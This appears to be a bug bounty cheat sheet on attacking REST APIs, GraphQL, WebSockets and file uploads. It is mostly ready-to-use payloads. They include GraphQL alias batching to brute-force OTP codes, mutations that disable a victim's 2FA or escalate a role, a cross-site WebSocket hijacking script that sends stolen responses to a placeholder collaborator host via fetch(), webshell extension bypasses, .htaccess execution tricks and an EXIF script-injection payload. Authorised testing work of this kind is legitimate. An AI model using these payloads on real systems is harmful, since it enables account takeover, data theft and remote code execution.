---
title: "APIs, GraphQL, WebSockets & File Uploads"
description: "REST API security, GraphQL introspection and batching attacks, WebSocket hijacking, and file upload to RCE techniques"
tags:
  - Bug Bounty
  - API
  - GraphQL
  - File Upload
  - WebSocket
---

# APIs, GraphQL, WebSockets & File Uploads

---

## 1. REST API Testing Methodology

=== " Discovery & Documentation Mining"

    ```bash
    # Common API docs & schema locations
    /swagger-ui.html /swagger/v1/swagger.json /v2/api-docs /v3/api-docs
    /api-docs /openapi.json /redoc /graphql /graphiql /playground
    /api/v1/ /api/v2/ /rest/ /internal/ /.well-known/openid-configuration
    # Second-version shadow APIs (the #1 source of broken authz)
    # If you see /api/v2/users — also test v1, v3, v0, beta, internal, legacy, mobile, staging
    # Mobile-only endpoints — pull the APK/IPA and grep for API paths
    apktool d app.apk && grep -rEi 'https?://[a-z0-9._/-]+' app/ | sort -u
    # Extract endpoints from JS bundles & source maps (see Recon section)
    xnLinkFinder -i js_urls.txt -sf <DOMAIN> -o api_endpoints.txt
    ```

=== " OWASP API Top 10 Quick Tests"

    ```text
    API1 Broken Object Level Authorization (BOLA) -> see IDOR page
    API2 Broken Authentication -> weak JWT, no token expiry, API keys in URLs
    API3 Broken Object Property Level Auth (BOPLA)-> mass assignment, hidden fields
    API4 Unrestricted Resource Consumption -> no pagination limit (?limit=999999)
    API5 Broken Function Level Authorization -> call admin-only endpoints as normal user
    API6 Unrestricted Access to Sensitive Flows -> no rate limit on signup/OTP/reset
    API7 SSRF -> see SSRF page
    API8 Security Misconfiguration -> CORS *, debug endpoints, verbose errors
    API9 Improper Inventory Management -> old/shadow API versions still live
    API10 Unsafe Consumption of 3rd-Party APIs -> webhook/integration trust issues
    # Always try:
    ?limit=999999 ?page=0 ?offset=-1 ?sort=password ?fields=* ?include=all
    ?filter[password][$ne]= ?expand=all ?debug=1 ?admin=1
    # Try HTTP methods: OPTIONS may reveal allowed methods; HEAD may bypass body validation
    # Remove auth header entirely; use an expired token; use a token from ANOTHER tenant
    ```

---

## 2. GraphQL Deep Dive

=== " Introspection & Schema Recovery"

    ```graphql
    # Full introspection query (often disabled — try these alternatives)
    { __schema { types { name fields { name type { name kind ofType { name } } } } } }
    # If introspection is blocked:
    # 1. Field suggestion errors: send "usr" -> "Did you mean 'user'?"
    # 2. GraphQL Voyager / clairvoyance for schema recovery via suggestions
    # 3. Check for a public .graphql schema file in the repo / source maps
    # 4. Try GET-based introspection on /graphql?query={__schema{...}}
    ```

    ```bash
    # Automated schema dump & analysis
    python3 graphql-cop.py -t https://<DOMAIN>/graphql
    clairvoyance -o schema.json https://<DOMAIN>/graphql
    # Then explore with graphql-voyager / Altair / GraphiQL
    ```

=== " GraphQL Attack Patterns"

    ```graphql
    # 1. IDOR via node() global object lookup
    { node(id: "VXNlcjoxMzM3") { ... on User { email passwordHash role } } }
    # base64 "User:1337" -> decode, change ID, re-encode
    # 2. Alias batching -> brute force OTP/2FA in ONE request (bypasses rate limits!)
    mutation {
      a1: verifyOtp(otp: "000000") { token }
      a2: verifyOtp(otp: "000001") { token }
      a3: verifyOtp(otp: "000002") { token }
      # ... up to 1000 aliases in a single HTTP request
    }
    # 3. Query batching (array of operations) for rate-limit bypass
    [{"query":"mutation{redeem(code:\"X\")}"},{"query":"mutation{redeem(code:\"X\")}"}]
    # 4. Deep recursion / circular fragments -> DoS
    fragment A on User { friends { ...B } } fragment B on User { friends { ...A } }
    # 5. Field stuffing for hidden fields
    { user(id: 1) { id email role isAdmin passwordHash apiKey mfaSecret internalNotes } }
    # 6. Mutation-based mass assignment
    mutation { updateUser(input: {id: 1, role: ADMIN, isVerified: true}) { user { id role } } }
    # 7. Disable 2FA / change email via mutations that are not mirrored in REST
    mutation { disableMfa(userId: <VICTIM_ID>) { success } }
    ```

---

## 3. WebSocket Security

```javascript
// 1. Unsafe Cross-Site WebSocket Hijacking (CSWSH) — NO Origin check on handshake
// If the WS relies only on cookies for auth and does not validate Origin,
// any site can connect using the victim's cookies:

const ws = new WebSocket('wss://<DOMAIN>/ws');
ws.onopen = () => ws.send(JSON.stringify({action: 'getProfile'}));
ws.onmessage = (e) => fetch('https://<COLLABORATOR_DOMAIN>/leak?d=' + encodeURIComponent(e.data));

// 2. Message-level authz: does the server enforce auth per-message or only at handshake?
// Try sending other users' IDs after connecting legitimately.
ws.send(JSON.stringify({action:'getMessages', userId: <VICTIM_ID>}));
ws.send(JSON.stringify({action:'subscribe', channel:'admin'}));

// 3. Injection in WS messages: the message payload may hit SQLi, NoSQLi, SSTI,
// command injection, or be rendered as HTML in the chat UI (stored XSS).
// 4. Handshake header injection via Sec-WebSocket-Protocol / subprotocol abuse.
// 5. Rate limiting: WS often has NO rate limit -> brute force via WS instead of HTTP.
```

---

## 4. File Upload to RCE

=== " Bypass Cheatsheet"

    ```text
    # Extension bypasses
    shell.php -> shell.php5 / .php7 / .phtml / .phar / .pgif
    shell.aspx -> shell.ashx / .asmx / .aspx%00.jpg / .asPx
    shell.jsp -> shell.jspx / .jspf / .jsw / .jsv
    shell.php.jpg -> shell.php%00.jpg / shell.php;.jpg / shell.php::$DATA
    shell.jpg -> shell.jpg/.php (path confusion) / shell.phP (case)
    shell.asp -> shell.asa / .cer / .cdx
    # Content-Type / magic-byte tricks
    Content-Type: image/png with body: GIF89a;<script>...</script>
    Prepend valid magic bytes: PNG header + PHP code (polyglot)
    # ImageTragick / SVG / XXE inside an image
    <svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>
    # .htaccess / web.config upload to enable execution of a weird extension
    AddType application/x-httpd-php .lol
    # Then upload shell.lol
    # Zip Slip / archive path traversal
    ../../../../var/www/html/shell.php inside the ZIP
    # Metadata / EXIF injection (also for stored XSS in admin panels)
    exiftool -Comment='"><script src=https://<COLLABORATOR_DOMAIN>/x.js></script>' img.jpg
    ```

=== " Chaining to RCE by Target Technology"

    ```bash
    # PHP: upload .htaccess + shell.lol OR a .user.ini with auto_prepend_file
    # Apache Tomcat / Java: deploy a malicious WAR via the manager app
    # Jenkins: /script console Groovy RCE via the built-in script console
    # Node/Express: filename path traversal in multer -> write to /app/views or .env
    # S3/Cloud: upload with ACL public-read + HTML content -> stored XSS on the bucket domain
    # (often trusted in CSP => full CSP bypass & session theft)
    # ImageMagick: MVG / MSL payloads -> SSRF and RCE (ImageTragick)
    # Ghostscript: EPS/PS uploads -> -dSAFER bypass -> RCE
    ```